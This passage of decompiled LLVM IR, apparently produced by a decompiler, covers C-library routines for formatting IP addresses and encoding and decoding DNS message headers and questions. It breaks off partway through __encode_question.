  br i1 %v9_1b1f0, label %dec_label_pc_1b1f8, label %dec_label_pc_1b228

dec_label_pc_1b1f8:                               ; preds = %dec_label_pc_1b1e8, %dec_label_pc_1b1d8
  %v2_1b1fc = sub i32 %v25_1b068, %v0_1b208
  %v0_1b200 = load i32, i32* @r8, align 4
  %v1_1b200 = add i32 %v0_1b200, 12
  %v1_1b204 = add i32 %v2_1b1fc, -32
  store i32 %v1_1b204, i32* %r2.global-to-local, align 4
  store i32 %v0_1b208, i32* %r1.global-to-local, align 4
  %v3_1b20c = call i32 @inet_ntop4(i32 %v1_1b200, i32 %v0_1b208, i32 %v1_1b204)
  %v2_1b210 = icmp eq i32 %v3_1b20c, 0
  br i1 %v2_1b210, label %dec_label_pc_1b29c, label %dec_label_pc_1b218

dec_label_pc_1b218:                               ; preds = %dec_label_pc_1b1f8
  %v0_1b218 = load i32, i32* @r4, align 4
  %v1_1b218 = inttoptr i32 %v0_1b218 to i8*
  %v3_1b21c = call i32 @strlen(i8* %v1_1b218)
  %v0_1b220 = load i32, i32* @r4, align 4
  %v2_1b220 = add i32 %v0_1b220, %v3_1b21c
  store i32 %v2_1b220, i32* @r4, align 4
  %v0_1b258.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1b258

dec_label_pc_1b228:                               ; preds = %dec_label_pc_1b1e8, %dec_label_pc_1b1e0, %dec_label_pc_1b1d0, %.thread3
  %v4_1b22c = mul i32 %v1_1b22c, 4
  %v5_1b22c = add i32 %v4_1b22c, %v25_1b068
  store i32 %v0_1b208, i32* @r0, align 4
  %v1_1b234 = add i32 %v5_1b22c, -32
  %v2_1b234 = inttoptr i32 %v1_1b234 to i32*
  %v3_1b234 = load i32, i32* %v2_1b234, align 4
  store i32 %v3_1b234, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1eb08.1046 to i32), i32* %r1.global-to-local, align 4
  %v4_1b23c = call i32 @sprintf(i32 %v0_1b208, i32 ptrtoint ([3 x i8]* @global_var_1eb08.1046 to i32), i32 %v3_1b234)
  %v0_1b240 = load i32, i32* @r4, align 4
  %v2_1b240 = add i32 %v0_1b240, %v4_1b23c
  store i32 %v2_1b240, i32* @r4, align 4
  br label %dec_label_pc_1b244

dec_label_pc_1b244:                               ; preds = %dec_label_pc_1b1ac, %bb51, %dec_label_pc_1b228
  %v3_1b1b424 = phi i32 [ %v3_1b1c464, %dec_label_pc_1b1ac ], [ %v6_1b1b4, %bb51 ], [ %v2_1b240, %dec_label_pc_1b228 ]
  %v0_1b244 = load i32, i32* @r5, align 4
  %v1_1b244 = add i32 %v0_1b244, 1
  %v0_1b190.pre = load i32, i32* @r6, align 4
  store i32 %v1_1b244, i32* @r5, align 4
  %v7_1b24c = icmp slt i32 %v1_1b244, 8
  %v7_1b190 = icmp eq i32 %v0_1b190.pre, -1
  br i1 %v7_1b24c, label %dec_label_pc_1b190, label %dec_label_pc_1b250

dec_label_pc_1b250:                               ; preds = %dec_label_pc_1b244
  br i1 %v7_1b190, label %.thread4, label %dec_label_pc_1b258

dec_label_pc_1b258:                               ; preds = %dec_label_pc_1b250, %dec_label_pc_1b218
  %v3_1b264 = phi i32 [ %v3_1b1b424, %dec_label_pc_1b250 ], [ %v2_1b220, %dec_label_pc_1b218 ]
  %v0_1b258 = phi i32 [ %v0_1b190.pre, %dec_label_pc_1b250 ], [ %v0_1b258.pre, %dec_label_pc_1b218 ]
  %v1_1b258 = load i32, i32* @r7, align 4
  %v2_1b258 = add i32 %v1_1b258, %v0_1b258
  %v7_1b25c = icmp eq i32 %v2_1b258, 8
  br i1 %v7_1b25c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_1b258
  %v4_1b264 = inttoptr i32 %v3_1b264 to i8*
  store i8 58, i8* %v4_1b264, align 1
  %v5_1b264 = load i32, i32* @r4, align 4
  %v6_1b264 = add i32 %v5_1b264, 1
  store i32 %v6_1b264, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1b258, %dec_label_pc_1b250, %bb53
  %v2_1b26c = phi i32 [ %v3_1b264, %dec_label_pc_1b258 ], [ %v3_1b1b424, %dec_label_pc_1b250 ], [ %v6_1b264, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1b26c = inttoptr i32 %v2_1b26c to i8*
  store i8 0, i8* %v3_1b26c, align 1
  %v4_1b26c = load i32, i32* @r4, align 4
  %v5_1b26c = add i32 %v4_1b26c, 1
  store i32 %v2_1b184, i32* %r1.global-to-local, align 4
  %v2_1b274 = sub i32 %v5_1b26c, %v2_1b184
  %v1_1b278 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_1b274, %v1_1b278
  br i1 %tmp69, label %dec_label_pc_1b280, label %dec_label_pc_1b294

dec_label_pc_1b280:                               ; preds = %.thread4
  %v0_1b280 = call i32 @__errno_location()
  %v0_1b288 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1b288, i32* %r2.global-to-local, align 4
  %v2_1b28c = inttoptr i32 %v0_1b280 to i32*
  store i32 28, i32* %v2_1b28c, align 4
  %v0_1b2b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b2b4

dec_label_pc_1b294:                               ; preds = %.thread4
  %v0_1b294 = load i32, i32* @sb, align 4
  %v2_1b298 = bitcast i32* %stack_var_-110 to i8*
  %v3_1b298 = call i32 @strcpy(i32 %v0_1b294, i8* %v2_1b298)
  br label %dec_label_pc_1b29c

dec_label_pc_1b29c:                               ; preds = %dec_label_pc_1b1f8, %dec_label_pc_1b090, %dec_label_pc_1b294
  %v0_1b29c = phi i32 [ 0, %dec_label_pc_1b1f8 ], [ %v3_1b09c, %dec_label_pc_1b090 ], [ %v3_1b298, %dec_label_pc_1b294 ]
  store i32 %v0_1b29c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b2b4

dec_label_pc_1b2a4:                               ; preds = %dec_label_pc_1b084
  %v0_1b2a4 = call i32 @__errno_location()
  %v2_1b2ac = inttoptr i32 %v0_1b2a4 to i32*
  store i32 97, i32* %v2_1b2ac, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b2b4

dec_label_pc_1b2b4:                               ; preds = %dec_label_pc_1b29c, %dec_label_pc_1b280, %dec_label_pc_1b2a4
  %v0_1b2b4 = phi i32 [ %v0_1b29c, %dec_label_pc_1b29c ], [ %v0_1b2b4.pre, %dec_label_pc_1b280 ], [ 0, %dec_label_pc_1b2a4 ]
  store i32 %v6_1b068, i32* %r5.global-to-local, align 4
  ret i32 %v0_1b2b4

; uselistorder directives
  uselistorder i1 %v7_1b190, { 1, 0 }
  uselistorder i32 %v0_1b190.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1b244, { 1, 0, 2 }
  uselistorder i32 %v0_1b208, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_1b1c464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1b1ac65, { 2, 0, 1 }
  uselistorder i32 %v0_1b1bc66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_1b184, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1b19023, { 1, 0 }
  uselistorder i32 %v0_1b174, { 1, 2, 0 }
  uselistorder i32 %v1_1b148, { 1, 2, 0 }
  uselistorder i32 %v0_1b15c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1b170, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1b110, { 1, 0 }
  uselistorder i32 %v0_1b148, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1b12c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1b13c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1b0e0, { 2, 1, 0 }
  uselistorder i32 %v1_1b0c0, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_1b068, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 8, 7, 6, 0 }
  uselistorder i32 97, { 2, 3, 6, 0, 1, 7, 4, 5 }
  uselistorder i32 ()* @__GI_memset, { 18, 17, 9, 6, 3, 8, 7, 5, 0, 2, 15, 16, 1, 4, 19, 14, 13, 12, 11, 10 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1b2b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b29c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b244, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1b190, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b174, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b16c, { 1, 0 }
  uselistorder label %dec_label_pc_1b148, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1b144, { 1, 0 }
  uselistorder label %dec_label_pc_1b0fc, { 1, 0 }
  uselistorder label %dec_label_pc_1b0d0, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_1b2cc = load i32, i32* @r4, align 4
  store i32 %v3_1b2cc, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_1b2dc = icmp sgt i32 %arg3, 11
  br i1 %v7_1b2dc, label %dec_label_pc_1b2e0, label %dec_label_pc_1b3a8

dec_label_pc_1b2e0:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_1b2e0 = add i32 %tmp, 1
  %v2_1b2e0 = inttoptr i32 %v1_1b2e0 to i8*
  %v3_1b2e0 = load i8, i8* %v2_1b2e0, align 1
  store i8 %v3_1b2e0, i8* %tmp18, align 1
  %v2_1b2e8 = load i32, i32* %arg1, align 4
  %v1_1b2ec = trunc i32 %v2_1b2e8 to i8
  %v4_1b2ec = add i32 %arg2, 1
  %v5_1b2ec = inttoptr i32 %v4_1b2ec to i8*
  store i8 %v1_1b2ec, i8* %v5_1b2ec, align 1
  %v0_1b2f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b2f0 = add i32 %v0_1b2f0, 12
  %v2_1b2f0 = inttoptr i32 %v1_1b2f0 to i32*
  %v3_1b2f0 = load i32, i32* %v2_1b2f0, align 4
  %v1_1b2f4 = add i32 %v0_1b2f0, 4
  %v2_1b2f4 = inttoptr i32 %v1_1b2f4 to i32*
  %v3_1b2f4 = load i32, i32* %v2_1b2f4, align 4
  %v1_1b2f8 = add i32 %v0_1b2f0, 16
  %v2_1b2f8 = inttoptr i32 %v1_1b2f8 to i32*
  %v3_1b2f8 = load i32, i32* %v2_1b2f8, align 4
  %v1_1b2fc = add i32 %tmp, 8
  %v2_1b2fc = inttoptr i32 %v1_1b2fc to i32*
  %v3_1b2fc = load i32, i32* %v2_1b2fc, align 4
  %v2_1b300 = icmp eq i32 %v3_1b2f0, 0
  %. = select i1 %v2_1b300, i32 0, i32 4
  %v2_1b30c = icmp eq i32 %v3_1b2f4, 0
  %v1_1b310 = add i32 %v0_1b2f0, 20
  %v2_1b310 = inttoptr i32 %v1_1b310 to i32*
  %v3_1b310 = load i32, i32* %v2_1b310, align 4
  %storemerge12 = select i1 %v2_1b30c, i32 0, i32 128
  %v1_1b31c = urem i32 %v3_1b2fc, 16
  %v2_1b320 = icmp eq i32 %v3_1b2f8, 0
  %.29 = select i1 %v2_1b320, i32 0, i32 2
  %v4_1b32c = mul nuw nsw i32 %v1_1b31c, 8
  %v5_1b32c = or i32 %v4_1b32c, %.
  %v2_1b330 = icmp eq i32 %v3_1b310, 0
  br i1 %v2_1b330, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_1b2e0
  %v2_1b334 = or i32 %v5_1b32c, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1b2e0, %bb25
  %v1_1b33c = phi i32 [ %v5_1b32c, %dec_label_pc_1b2e0 ], [ %v2_1b334, %bb25 ]
  %v2_1b338 = or i32 %.29, %storemerge12
  %v2_1b33c = or i32 %v2_1b338, %v1_1b33c
  %v1_1b340 = trunc i32 %v2_1b33c to i8
  %v2_1b340 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b340 = add i32 %v2_1b340, 2
  %v4_1b340 = inttoptr i32 %v3_1b340 to i8*
  store i8 %v1_1b340, i8* %v4_1b340, align 1
  %v0_1b344 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b344 = add i32 %v0_1b344, 24
  %v1_1b348 = inttoptr i32 %v1_1b344 to i32*
  %v2_1b348 = load i32, i32* %v1_1b348, align 4
  %v3_1b348 = add i32 %v0_1b344, 28
  %v4_1b348 = inttoptr i32 %v3_1b348 to i32*
  %v5_1b348 = load i32, i32* %v4_1b348, align 4
  %v2_1b34c = icmp eq i32 %v2_1b348, 0
  %v1_1b350 = urem i32 %v5_1b348, 16
  %.30 = select i1 %v2_1b34c, i32 0, i32 128
  %v2_1b35c = or i32 %v1_1b350, %.30
  %v1_1b360 = trunc i32 %v2_1b35c to i8
  %v2_1b360 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b360 = add i32 %v2_1b360, 3
  %v4_1b360 = inttoptr i32 %v3_1b360 to i8*
  store i8 %v1_1b360, i8* %v4_1b360, align 1
  %v0_1b364 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b364 = add i32 %v0_1b364, 33
  %v2_1b364 = inttoptr i32 %v1_1b364 to i8*
  %v3_1b364 = load i8, i8* %v2_1b364, align 1
  %v2_1b368 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b368 = add i32 %v2_1b368, 4
  %v4_1b368 = inttoptr i32 %v3_1b368 to i8*
  store i8 %v3_1b364, i8* %v4_1b368, align 1
  %v0_1b36c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b36c = add i32 %v0_1b36c, 32
  %v2_1b36c = inttoptr i32 %v1_1b36c to i32*
  %v3_1b36c = load i32, i32* %v2_1b36c, align 4
  %v1_1b370 = trunc i32 %v3_1b36c to i8
  %v2_1b370 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b370 = add i32 %v2_1b370, 5
  %v4_1b370 = inttoptr i32 %v3_1b370 to i8*
  store i8 %v1_1b370, i8* %v4_1b370, align 1
  %v0_1b374 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b374 = add i32 %v0_1b374, 37
  %v2_1b374 = inttoptr i32 %v1_1b374 to i8*
  %v3_1b374 = load i8, i8* %v2_1b374, align 1
  %v2_1b378 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b378 = add i32 %v2_1b378, 6
  %v4_1b378 = inttoptr i32 %v3_1b378 to i8*
  store i8 %v3_1b374, i8* %v4_1b378, align 1
  %v0_1b37c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b37c = add i32 %v0_1b37c, 36
  %v2_1b37c = inttoptr i32 %v1_1b37c to i32*
  %v3_1b37c = load i32, i32* %v2_1b37c, align 4
  %v1_1b380 = trunc i32 %v3_1b37c to i8
  %v2_1b380 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b380 = add i32 %v2_1b380, 7
  %v4_1b380 = inttoptr i32 %v3_1b380 to i8*
  store i8 %v1_1b380, i8* %v4_1b380, align 1
  %v0_1b384 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b384 = add i32 %v0_1b384, 41
  %v2_1b384 = inttoptr i32 %v1_1b384 to i8*
  %v3_1b384 = load i8, i8* %v2_1b384, align 1
  %v2_1b388 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b388 = add i32 %v2_1b388, 8
  %v4_1b388 = inttoptr i32 %v3_1b388 to i8*
  store i8 %v3_1b384, i8* %v4_1b388, align 1
  %v0_1b38c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b38c = add i32 %v0_1b38c, 40
  %v2_1b38c = inttoptr i32 %v1_1b38c to i32*
  %v3_1b38c = load i32, i32* %v2_1b38c, align 4
  %v1_1b390 = trunc i32 %v3_1b38c to i8
  %v2_1b390 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b390 = add i32 %v2_1b390, 9
  %v4_1b390 = inttoptr i32 %v3_1b390 to i8*
  store i8 %v1_1b390, i8* %v4_1b390, align 1
  %v0_1b394 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b394 = add i32 %v0_1b394, 45
  %v2_1b394 = inttoptr i32 %v1_1b394 to i8*
  %v3_1b394 = load i8, i8* %v2_1b394, align 1
  %v2_1b398 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b398 = add i32 %v2_1b398, 10
  %v4_1b398 = inttoptr i32 %v3_1b398 to i8*
  store i8 %v3_1b394, i8* %v4_1b398, align 1
  %v0_1b39c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b39c = add i32 %v0_1b39c, 44
  %v2_1b39c = inttoptr i32 %v1_1b39c to i32*
  %v3_1b39c = load i32, i32* %v2_1b39c, align 4
  %v1_1b3a0 = trunc i32 %v3_1b39c to i8
  %v2_1b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b3a0 = add i32 %v2_1b3a0, 11
  %v4_1b3a0 = inttoptr i32 %v3_1b3a0 to i8*
  store i8 %v1_1b3a0, i8* %v4_1b3a0, align 1
  %v2_1b3ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1b3a8

dec_label_pc_1b3a8:                               ; preds = %entry, %bb26
  %v2_1b3ac = phi i32 [ %v3_1b2cc, %entry ], [ %v2_1b3ac.pre, %bb26 ]
  %v0_1b3a8 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_1b3ac, i32* @r4, align 4
  ret i32 %v0_1b3a8

; uselistorder directives
  uselistorder i32 %tmp, { 1, 2, 0 }
  uselistorder i32 45, { 5, 2, 3, 0, 1, 4 }
  uselistorder i32 37, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b3a8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1b3b0 = load i8, i8* %arg1, align 1
  %v4_1b3b0 = zext i8 %v3_1b3b0 to i32
  %v2_1b3b4 = add i32 %tmp, 1
  %v3_1b3b4 = inttoptr i32 %v2_1b3b4 to i8*
  %v4_1b3b4 = load i8, i8* %v3_1b3b4, align 1
  %v5_1b3b4 = zext i8 %v4_1b3b4 to i32
  %v4_1b3b8 = mul nuw nsw i32 %v4_1b3b0, 256
  %v5_1b3b8 = or i32 %v5_1b3b4, %v4_1b3b8
  %v2_1b3bc = inttoptr i32 %arg2 to i32*
  store i32 %v5_1b3b8, i32* %v2_1b3bc, align 4
  %v2_1b3c0 = add i32 %tmp, 2
  %v3_1b3c0 = inttoptr i32 %v2_1b3c0 to i8*
  %v4_1b3c0 = load i8, i8* %v3_1b3c0, align 1
  %tmp4 = icmp slt i8 %v4_1b3c0, 0
  %v3_1b3c4 = zext i1 %tmp4 to i32
  %v2_1b3c8 = add i32 %arg2, 4
  %v3_1b3c8 = inttoptr i32 %v2_1b3c8 to i32*
  store i32 %v3_1b3c4, i32* %v3_1b3c8, align 4
  %v4_1b3cc = load i8, i8* %v3_1b3c0, align 1
  %div = udiv i8 %v4_1b3cc, 8
  %tmp5 = urem i8 %div, 16
  %v1_1b3d4 = zext i8 %tmp5 to i32
  %v2_1b3d8 = add i32 %arg2, 8
  %v3_1b3d8 = inttoptr i32 %v2_1b3d8 to i32*
  store i32 %v1_1b3d4, i32* %v3_1b3d8, align 4
  %v4_1b3dc = load i8, i8* %v3_1b3c0, align 1
  %div1 = udiv i8 %v4_1b3dc, 4
  %tmp6 = urem i8 %div1, 2
  %v1_1b3e4 = zext i8 %tmp6 to i32
  %v2_1b3e8 = add i32 %arg2, 12
  %v3_1b3e8 = inttoptr i32 %v2_1b3e8 to i32*
  store i32 %v1_1b3e4, i32* %v3_1b3e8, align 4
  %v4_1b3ec = load i8, i8* %v3_1b3c0, align 1
  %div2 = udiv i8 %v4_1b3ec, 2
  %tmp7 = urem i8 %div2, 2
  %v1_1b3f4 = zext i8 %tmp7 to i32
  %v2_1b3f8 = add i32 %arg2, 16
  %v3_1b3f8 = inttoptr i32 %v2_1b3f8 to i32*
  store i32 %v1_1b3f4, i32* %v3_1b3f8, align 4
  %v4_1b3fc = load i8, i8* %v3_1b3c0, align 1
  %tmp8 = urem i8 %v4_1b3fc, 2
  %v1_1b400 = zext i8 %tmp8 to i32
  %v2_1b404 = add i32 %arg2, 20
  %v3_1b404 = inttoptr i32 %v2_1b404 to i32*
  store i32 %v1_1b400, i32* %v3_1b404, align 4
  %v2_1b408 = add i32 %tmp, 3
  %v3_1b408 = inttoptr i32 %v2_1b408 to i8*
  %v4_1b408 = load i8, i8* %v3_1b408, align 1
  %tmp9 = icmp slt i8 %v4_1b408, 0
  %v3_1b40c = zext i1 %tmp9 to i32
  %v2_1b410 = add i32 %arg2, 24
  %v3_1b410 = inttoptr i32 %v2_1b410 to i32*
  store i32 %v3_1b40c, i32* %v3_1b410, align 4
  %v4_1b414 = load i8, i8* %v3_1b408, align 1
  %tmp10 = urem i8 %v4_1b414, 16
  %v1_1b418 = zext i8 %tmp10 to i32
  %v2_1b41c = add i32 %arg2, 28
  %v3_1b41c = inttoptr i32 %v2_1b41c to i32*
  store i32 %v1_1b418, i32* %v3_1b41c, align 4
  %v2_1b420 = add i32 %tmp, 4
  %v3_1b420 = inttoptr i32 %v2_1b420 to i8*
  %v4_1b420 = load i8, i8* %v3_1b420, align 1
  %v5_1b420 = zext i8 %v4_1b420 to i32
  %v2_1b424 = add i32 %tmp, 5
  %v3_1b424 = inttoptr i32 %v2_1b424 to i8*
  %v4_1b424 = load i8, i8* %v3_1b424, align 1
  %v5_1b424 = zext i8 %v4_1b424 to i32
  %v4_1b428 = mul nuw nsw i32 %v5_1b420, 256
  %v5_1b428 = or i32 %v5_1b424, %v4_1b428
  %v2_1b42c = add i32 %arg2, 32
  %v3_1b42c = inttoptr i32 %v2_1b42c to i32*
  store i32 %v5_1b428, i32* %v3_1b42c, align 4
  %v2_1b430 = add i32 %tmp, 6
  %v3_1b430 = inttoptr i32 %v2_1b430 to i8*
  %v4_1b430 = load i8, i8* %v3_1b430, align 1
  %v5_1b430 = zext i8 %v4_1b430 to i32
  %v2_1b434 = add i32 %tmp, 7
  %v3_1b434 = inttoptr i32 %v2_1b434 to i8*
  %v4_1b434 = load i8, i8* %v3_1b434, align 1
  %v5_1b434 = zext i8 %v4_1b434 to i32
  %v4_1b438 = mul nuw nsw i32 %v5_1b430, 256
  %v5_1b438 = or i32 %v5_1b434, %v4_1b438
  %v2_1b43c = add i32 %arg2, 36
  %v3_1b43c = inttoptr i32 %v2_1b43c to i32*
  store i32 %v5_1b438, i32* %v3_1b43c, align 4
  %v2_1b440 = add i32 %tmp, 8
  %v3_1b440 = inttoptr i32 %v2_1b440 to i8*
  %v4_1b440 = load i8, i8* %v3_1b440, align 1
  %v5_1b440 = zext i8 %v4_1b440 to i32
  %v2_1b444 = add i32 %tmp, 9
  %v3_1b444 = inttoptr i32 %v2_1b444 to i8*
  %v4_1b444 = load i8, i8* %v3_1b444, align 1
  %v5_1b444 = zext i8 %v4_1b444 to i32
  %v4_1b448 = mul nuw nsw i32 %v5_1b440, 256
  %v5_1b448 = or i32 %v5_1b444, %v4_1b448
  %v2_1b44c = add i32 %arg2, 40
  %v3_1b44c = inttoptr i32 %v2_1b44c to i32*
  store i32 %v5_1b448, i32* %v3_1b44c, align 4
  %v2_1b450 = add i32 %tmp, 11
  %v3_1b450 = inttoptr i32 %v2_1b450 to i8*
  %v4_1b450 = load i8, i8* %v3_1b450, align 1
  %v5_1b450 = zext i8 %v4_1b450 to i32
  %v2_1b454 = add i32 %tmp, 10
  %v3_1b454 = inttoptr i32 %v2_1b454 to i8*
  %v4_1b454 = load i8, i8* %v3_1b454, align 1
  %v5_1b454 = zext i8 %v4_1b454 to i32
  %v4_1b45c = mul nuw nsw i32 %v5_1b454, 256
  %v5_1b45c = or i32 %v4_1b45c, %v5_1b450
  %v2_1b460 = add i32 %arg2, 44
  %v3_1b460 = inttoptr i32 %v2_1b460 to i32*
  store i32 %v5_1b45c, i32* %v3_1b460, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 40, { 11, 12, 20, 21, 14, 6, 7, 8, 9, 4, 22, 1, 13, 2, 0, 15, 16, 17, 18, 19, 5, 10, 3 }
  uselistorder i32 28, { 42, 5, 6, 7, 4, 58, 43, 59, 62, 47, 49, 8, 50, 48, 20, 21, 1, 22, 23, 24, 25, 26, 9, 27, 15, 10, 16, 17, 60, 2, 61, 41, 3, 44, 45, 51, 52, 53, 54, 55, 56, 0, 57, 28, 46, 36, 63, 64, 65, 66, 29, 30, 31, 32, 33, 34, 35, 37, 38, 11, 12, 13, 14, 39, 40, 18, 19 }
  uselistorder i8 2, { 0, 1, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1b468 = load i32, i32* @r4, align 4
  store i32 %v3_1b468, i32* %stack_var_-16, align 4
  %v6_1b468 = load i32, i32* @r5, align 4
  %v9_1b468 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1b470 = load i32, i32* %arg1, align 4
  store i32 %v2_1b470, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_1b47c = inttoptr i32 %v2_1b470 to i8*
  %v2_1b47c = call i32 @__encode_dotted(i8* %v1_1b47c)
  store i32 %v2_1b47c, i32* %r0.global-to-local, align 4
  %v1_1b480 = icmp slt i32 %v2_1b47c, 0
  br i1 %v1_1b480, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_1b488 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_1b488, i32* @r4, align 4
  store i32 %v6_1b468, i32* @r5, align 4
  store i32 %v9_1b468, i32* @r6, align 4
  ret i32 %v2_1b47c

bb6:                                              ; preds = %entry
  %v1_1b484 = load i32, i32* @r4, align 4
  %v2_1b484 = sub i32 %v1_1b484, %v2_1b47c
  %v0_1b490 = load i32, i32* @r6, align 4
  %v2_1b490 = add i32 %v0_1b490, %v2_1b47c
  store i32 %v2_1b490, i32* %r2.global-to-local, align 4
  %v7_1b494 = icmp sgt i32 %v2_1b484, 3
  br i1 %v7_1b494, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_1b498 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_1b498, i32* @r4, align 4
  store i32 %v6_1b468, i32* @r5, align 4
  store i32 %v9_1b468, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_1b49c = load i32, i32* @r5, align 4
  %v1_1b49c = add i32 %v0_1b49c, 5
  %v2_1b49c = inttoptr i32 %v1_1b49c to i8*
  %v3_1b49c = load i8, i8* %v2_1b49c, align 1
  %v5_1b4a0 = inttoptr i32 %v2_1b490 to i8*
  store i8 %v3_1b49c, i8* %v5_1b4a0, align 1
  %v0_1b4a4 = load i32, i32* @r5, align 4
  %v1_1b4a4 = add i32 %v0_1b4a4, 4
  %v2_1b4a4 = inttoptr i32 %v1_1b4a4 to i32*
  %v3_1b4a4 = load i32, i32* %v2_1b4a4, align 4
  %v1_1b4a8 = trunc i32 %v3_1b4a4 to i8
  %v2_1b4a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_1b4a8 = add i32 %v2_1b4a8, 1
  %v4_1b4a8 = inttoptr i32 %v3_1b4a8 to i8*
  store i8 %v1_1b4a8, i8* %v4_1b4a8, align 1
  %v0_1b4ac = load i32, i32* @r5, align 4
  %v1_1b4ac = add i32 %v0_1b4ac, 9
  %v2_1b4ac = inttoptr i32 %v1_1b4ac to i8*
  %v3_1b4ac = load i8, i8* %v2_1b4ac, align 1
  %v2_1b4b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_1b4b0 = add i32 %v2_1b4b0, 2
  %v4_1b4b0 = inttoptr i32 %v3_1b4b0 to i8*
  store i8 %v3_1b4ac, i8* %v4_1b4b0, align 1
  %v0_1b4b4 = load i32, i32* @r5, align 4
  %v1_1b4b4 = add i32 %v0_1b4b4, 8
  %v2_1b4b4 = inttoptr i32 %v1_1b4b4 to i32*
  %v3_1b4b4 = load i32, i32* %v2_1b4b4, align 4
